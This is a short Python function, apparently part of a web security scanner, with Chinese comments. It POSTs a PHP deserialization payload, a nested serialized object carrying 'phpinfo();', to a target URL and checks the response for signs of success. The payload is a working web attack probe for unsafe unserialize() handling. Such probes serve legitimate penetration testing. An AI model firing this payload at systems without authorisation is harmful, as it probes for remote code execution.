import requests
import re
from .utils import make_request_with_timeout, process_attack_response


def attack_php_deserialization(url, headers, pattern, success, fail, error):
    """
    PHP反序列化攻击测试
    """
    # 定义 PHP 反序列化恶意 payload
    data = {
        "answer": 'O:7:"chybeta":1:{s:4:"test";O:7:"ph0en2x":1:{s:5:"test2";s:10:"phpinfo();";}}'
    }

    # 发送请求
    success_flag, response_or_error, status_code = make_request_with_timeout(
        url, headers, method='POST', data=data
    )
    
    # 处理响应
    return process_attack_response(
        "PHP反序列化", success_flag, response_or_error, status_code, 
        pattern, success, fail, error
    )